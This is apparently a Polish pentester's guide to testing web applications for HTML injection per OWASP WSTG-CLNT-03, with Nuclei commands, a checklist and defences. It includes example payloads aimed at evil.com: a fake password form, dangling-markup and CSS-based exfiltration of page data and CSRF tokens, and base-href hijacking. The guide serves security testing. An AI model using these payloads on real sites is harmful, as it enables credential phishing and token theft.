# WSTG-CLNT-03 — Testing for HTML Injection

## Cel

Wykrycie reflectowania user input jako HTML bez script execution — wystarczy structural HTML (form, iframe, base, meta refresh) żeby phishing/clickjacking pivot. Ważne nawet gdy aplikacja ma robust XSS filter.

## Automatyzacja Nuclei

### Nasz dedykowany szablon

```bash
nuclei -l burp-export.xml -im burp \
       -t templates/wstg-clnt-03-html-injection.yaml
```

Szablon fuzzuje query/body/cookie/header z structural tags (`<form>`, `<iframe>`, `<base>`, `<meta refresh>`) + dangling markup (Frans Rosén). Detekcja: tag injection w body z renderable Content-Type.

### Cross-reference

```bash
# Reflected XSS - może też wykryć HTML injection
nuclei -l burp-export.xml -im burp -t templates/wstg-inpv-01-reflected-xss.yaml
```

## Coverage Matrix

| Wymiar | Pokryte | Nie pokryte |
|---|---|---|
| Structural tag injection (form/iframe/base/meta) | ✓ | — |
| Dangling markup (Frans Rosén pattern) | ✓ | — |
| Reflection w wszystkich częściach żądania | ✓ | — |
| Markdown rendering (subset HTML allowed by design) | częściowe | manual review |
| DOMPurify-protected | — | aplikacje z sanityzacją OK |

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (4 kroki)

1. **Probe each input field**: form fields, URL params, headers (Referer, User-Agent).
2. **Structural tags**: `<form action="evil.com">`, `<iframe src="evil.com">`, `<base href="evil.com/">`.
3. **Dangling markup attack**: `<img src='` (unclosed) — przechwytuje content do końca body.
4. **Markdown abuse**: jeśli rendering markdown, próbować HTML w markdown blocks.

### Co MUSI być sprawdzone (8 punktów)

- [ ] Każde pole formularza testowane structural tags
- [ ] URL parameters
- [ ] Cookies (np. preference cookie reflectowane w UI)
- [ ] Headers (Referer, User-Agent, X-Forwarded-For)
- [ ] Markdown fields (komentarze, profil bio)
- [ ] Dangling markup w hidden contexts
- [ ] PDF/email rendering (jeśli aplikacja generuje)
- [ ] Print page (CSS @media print rendering)

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross_Site_Scripting_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### HTML Injection — czym jest

- Atakujący wstrzykuje HTML który jest renderowany w kontekście przeglądarki ofiary
- Różnica od XSS: HTML injection nie musi zawierać JavaScript — może to być fałszywy formularz (phishing)
- Payload: `<form action="https://evil.com/steal"><input name="pass" type="password"><input type="submit" value="Login"></form>`

### Output Encoding — primary defense

- **HTML context**: encode `&`, `<`, `>`, `"`, `'` jako HTML entities
- **HTML attribute**: encode WSZYSTKIE nie-alfanumeryczne znaki jako `&#xHH;`
- **URL context**: URL encode parametrów
- Używaj **frameworkowego auto-escaping** — NIE wyłączaj go (React, Angular, Vue domyślnie enkodują)

### HTML Sanitization

- Jeśli MUSISZ akceptować HTML od użytkownika — użyj **DOMPurify** (client) lub **Bleach** (Python)
- **Allowlist** tagów: `<b>`, `<i>`, `<p>`, `<br>`, `<ul>`, `<li>` — TYLKO bezpieczne tagi
- **Allowlist** atrybutów: `class`, `id`, `href` (z walidacją URL) — NIGDY event handlers
- **NIGDY** nie używaj regex do sanityzacji HTML — zbyt skomplikowane, łatwe do obejścia

### Content-Type i encoding

- Ustaw `Content-Type: text/html; charset=UTF-8` — zapobiega sniffingowi charset
- Ustaw `X-Content-Type-Options: nosniff` — przeglądarka nie będzie zgadywać typu MIME
- Brak charset = przeglądarka może zinterpretować dane w innym encoding → obejście filtrów

## Pentesterskie deep dive

### Mniej znane techniki

- **Dangling markup data exfiltration**: `<img src='https://evil.com/?` (unclosed quote) — wszystko do następnego `'` lub `>` jest treated as URL = data exfil bez JS execution. Frans Rosén research.
- **CSS injection via HTML attribute**: nawet bez script execution, `<div style="background:url(evil.com/?{{token}})">` exfiltrates CSRF token.
- **`<base href>` injection**: zmienia base URL dla wszystkich relative links → atakujący przekierowuje wszystkie subsequent fetches.
- **Markdown image src injection**: `![alt](javascript:alert(1))` — niektóre markdown renderers nie filtrują schemy.
- **MathML / SVG smuggling**: `<math>`, `<svg>` mogą zawierać interactive elements które omijają niektóre HTML filters.

### Common pitfalls

- **HTML sanitizer wyłączony "for rich text"**: developers wyłączają sanitizer dla rich-text editor → inject XSS.
- **Markdown to HTML bypass**: niektóre converters (np. older markdown-it) nie filtrują wszystkich attribute injections.

### Świeżynki z research

- **HackTricks Dangling Markup**: https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
- **Frans Rosén research**: https://www.detectify.com/blog/

## Rozszerzenia Burp Suite

| Rozszerzenie | Opis | Link |
|---|---|---|
| Reflector | Detekcja reflected user input | [GitHub](https://github.com/elkokc/reflector) |

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection
- OWASP XSS Prevention CS: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- HackTricks Dangling Markup: https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection

### Wskazówki ASVS

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.3.3 | Output Encoding (L1) | Context-aware output encoding. |
| V5.3.6 | Output Encoding (L1) | Sanitize untrusted HTML inputs (allowlist). |
